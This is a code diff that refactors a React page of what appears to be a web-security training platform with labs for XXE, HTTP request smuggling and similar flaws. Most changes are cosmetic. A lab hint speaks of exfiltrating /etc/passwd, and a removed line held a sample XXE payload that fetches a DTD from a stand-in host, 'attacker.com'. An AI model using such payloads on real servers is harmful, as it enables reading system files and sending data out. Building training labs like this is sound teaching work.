@@ -1,11 +1,11 @@
 // src/pages/AdvancedLabs.jsx
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback, useRef } from 'react';
 import api from '../api/client';
 import Toast from '../components/Toast';
 import LoadingSpinner from '../components/LoadingSpinner';
 import EmptyState from '../components/EmptyState';
 import { motion, AnimatePresence } from 'framer-motion';
-import { Send, Copy, Check, Filter, Search, Beaker, AlertCircle, Clock, Zap, X } from "lucide-react";
+import { Send, Copy, Check, Filter, Search, Beaker, Zap, X } from 'lucide-react';
 
 const labs = [
   { id: "xxe", name: "XXE OOB", endpoint: "/api/vulnerabilities/xxe/oob", method: "POST", type: "xml", hint: "Use entidade externa para exfiltrar /etc/passwd", difficulty: "Hard", category: "Injection" },
@@ -17,16 +17,6 @@ const labs = [
   { id: "smuggling", name: "HTTP Smuggling", endpoint: "/api/vulnerabilities/smuggle/clte", method: "POST", hint: "Use CL + TE", difficulty: "Hard", category: "HTTP" },
 ];
 
-function IconSend({ className }) {
-  return <Send className={className} />;
-}
-function IconCopy({ className }) {
-  return <Copy className={className} />;
-}
-function IconCheck({ className }) {
-  return <Check className={className} />;
-}
-
 export default function AdvancedLabs() {
   const [selected, setSelected] = useState(labs[0]);
   const [input, setInput] = useState('');
@@ -37,22 +27,21 @@ export default function AdvancedLabs() {
   const [completedLabs, setCompletedLabs] = useState([]);
   const [filter, setFilter] = useState({ category: 'All', difficulty: 'All', search: '' });
 
-  useEffect(() => {
-    const fetchCompleted = async () => {
-      try {
-        const res = await api.get('/api/labs/completed');
-        setCompletedLabs(res.data);
-      } catch (err) {
-        console.error(err);
-      }
-    };
-    fetchCompleted();
-  }, []);
-
   const showToast = (message, type = 'success') => {
     setToast({ show: true, message, type });
     setTimeout(() => setToast({ show: false, message: '', type: 'success' }), 3000);
   };
+
+  const fetchCompleted = useCallback(async () => {
+    try {
+      const res = await api.get('/api/labs/completed');
+      setCompletedLabs(res.data);
+    } catch (err) {
+      console.error(err);
+    }
+  }, []);
+
+  useEffect(() => { fetchCompleted(); }, [fetchCompleted]);
 
   const send = async () => {
     setLoading(true);
@@ -68,7 +57,6 @@ export default function AdvancedLabs() {
         const data = selected.type === 'xml' ? input : { payload: input };
         res = await api.post(selected.endpoint, data);
       }
-
       const pretty = JSON.stringify(res.data, null, 2);
       setResponse(pretty);
 
@@ -124,24 +112,23 @@ export default function AdvancedLabs() {
         {toast.show && <Toast message={toast.message} type={toast.type} onClose={() => setToast({ show: false })} />}
       </AnimatePresence>
 
+      {/* Header */}
       <header className="bg-white shadow-sm border-bottom sticky-top">
-        <div className="container py-4">
-          <div className="d-flex justify-content-between align-items-center">
-            <div>
-              <h1 className="h4 fw-bold mb-1 d-flex align-items-center gap-2">
-                <Beaker size={24} /> Laboratórios Avançados
-              </h1>
-              <p className="text-muted mb-0">Desafios reais em ambiente controlado</p>
-            </div>
-            <motion.span
-              key={completedLabs.length}
-              initial={{ scale: 0.8 }}
-              animate={{ scale: 1 }}
-              className="badge bg-primary fs-6 rounded-pill"
-            >
-              {completedLabs.length}/{labs.length} concluídos
-            </motion.span>
+        <div className="container py-4 d-flex justify-content-between align-items-center">
+          <div>
+            <h1 className="h4 fw-bold d-flex align-items-center gap-2">
+              <Beaker size={24} /> Laboratórios Avançados
+            </h1>
+            <p className="text-muted mb-0">Desafios reais em ambiente controlado</p>
           </div>
+          <motion.span
+            key={completedLabs.length}
+            initial={{ scale: 0.8 }}
+            animate={{ scale: 1 }}
+            className="badge bg-primary fs-6 rounded-pill"
+          >
+            {completedLabs.length}/{labs.length} concluídos
+          </motion.span>
         </div>
       </header>
 
@@ -149,12 +136,7 @@ export default function AdvancedLabs() {
         <div className="row g-4">
           {/* Sidebar */}
           <div className="col-lg-4">
-            <motion.div
-              initial={{ opacity: 0, x: -20 }}
-              animate={{ opacity: 1, x: 0 }}
-              className="card border-0 shadow-sm sticky-top"
-              style={{ top: '1rem', borderRadius: '1rem' }}
-            >
+            <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} className="card border-0 shadow-sm sticky-top" style={{ top: '1rem', borderRadius: '1rem' }}>
               <div className="card-header bg-white">
                 <div className="d-flex justify-content-between align-items-center mb-3">
                   <strong className="d-flex align-items-center gap-2">
@@ -162,20 +144,10 @@ export default function AdvancedLabs() {
                   </strong>
                   <small className="text-muted">{filteredLabs.length}</small>
                 </div>
-
                 <div className="input-group mb-3">
-                  <span className="input-group-text bg-light border-end-0">
-                    <Search size={16} />
-                  </span>
-                  <input
-                    type="text"
-                    className="form-control border-start-0"
-                    placeholder="Buscar lab..."
-                    value={filter.search}
-                    onChange={e => setFilter({ ...filter, search: e.target.value })}
-                  />
+                  <span className="input-group-text bg-light border-end-0"><Search size={16} /></span>
+                  <input type="text" className="form-control border-start-0" placeholder="Buscar lab..." value={filter.search} onChange={e => setFilter({ ...filter, search: e.target.value })} />
                 </div>
-
                 <div className="row g-2">
                   <div className="col-12">
                     <select className="form-select form-select-sm" value={filter.category} onChange={e => setFilter({ ...filter, category: e.target.value })}>
@@ -213,7 +185,7 @@ export default function AdvancedLabs() {
                       >
                         <div className="d-flex justify-content-between align-items-center">
                           <div className="d-flex align-items-center gap-2">
-                            {completed && <IconCheck className="text-success" style={{ width: '16px', height: '16px' }} />}
+                            {completed && <Check className="text-success" style={{ width: '16px', height: '16px' }} />}
                             <strong>{lab.name}</strong>
                           </div>
                           <small className="text-muted">{lab.method}</small>
@@ -232,12 +204,7 @@ export default function AdvancedLabs() {
 
           {/* Main */}
           <div className="col-lg-8">
-            <motion.div
-              initial={{ opacity: 0, x: 20 }}
-              animate={{ opacity: 1, x: 0 }}
-              className="card border-0 shadow-sm"
-              style={{ borderRadius: '1rem' }}
-            >
+            <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="card border-0 shadow-sm" style={{ borderRadius: '1rem' }}>
               <div className="card-header bg-white d-flex justify-content-between align-items-start flex-wrap gap-2">
                 <div>
                   <h5 className="mb-1 d-flex align-items-center gap-2">
@@ -253,7 +220,7 @@ export default function AdvancedLabs() {
                 <div className="d-flex gap-2">
                   <button onClick={resetLab} className="btn btn-outline-secondary btn-sm">Limpar</button>
                   <button onClick={send} disabled={loading} className="btn btn-primary btn-sm d-flex align-items-center gap-1">
-                    <IconSend style={{ width: '16px', height: '16px' }} />
+                    <Send style={{ width: '16px', height: '16px' }} />
                     {loading ? 'Enviando...' : selected.method}
                   </button>
                 </div>
@@ -282,11 +249,10 @@ export default function AdvancedLabs() {
                     />
                     <div className="d-flex justify-content-between mt-3">
                       <button onClick={send} disabled={loading} className="btn btn-primary d-flex align-items-center gap-1">
-                        <IconSend style={{ width: '16px', height: '16px' }} />
-                        Enviar
+                        <Send style={{ width: '16px', height: '16px' }} /> Enviar
                       </button>
                       <button
-                        onClick={() => setInput(selected.type === 'xml' ? `<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">\n  %remote;\n]>\n<root>&send;</root>` : 'Bearer ')}
+                        onClick={() => setInput(selected.type === 'xml' ? `<?xml version="1.0"?>\n<!DOCTYPE root [ ... ]>\n<root>...</root>` : 'Bearer ')}
                         className="btn btn-outline-secondary btn-sm"
                       >
                         Exemplo
@@ -297,12 +263,11 @@ export default function AdvancedLabs() {
                   <div>
                     <div className="d-flex justify-content-between align-items-center mb-2">
                       <h6 className="mb-0">Resposta</h6>
-                      <div>
+                      <div className="d-flex gap-1">
                         <button onClick={copyResponse} className="btn btn-outline-secondary btn-sm d-flex align-items-center gap-1">
-                          <IconCopy style={{ width: '16px', height: '16px' }} />
-                          Copiar
+                          <Copy style={{ width: '16px', height: '16px' }} /> Copiar
                         </button>
-                        <button onClick={() => setResponse('')} className="btn btn-outline-danger btn-sm ms-1">Limpar</button>
+                        <button onClick={() => setResponse('')} className="btn btn-outline-danger btn-sm">Limpar</button>
                       </div>
                     </div>
                     <div className="bg-light border rounded p-3" style={{ maxHeight: '400px', overflow: 'auto' }}>
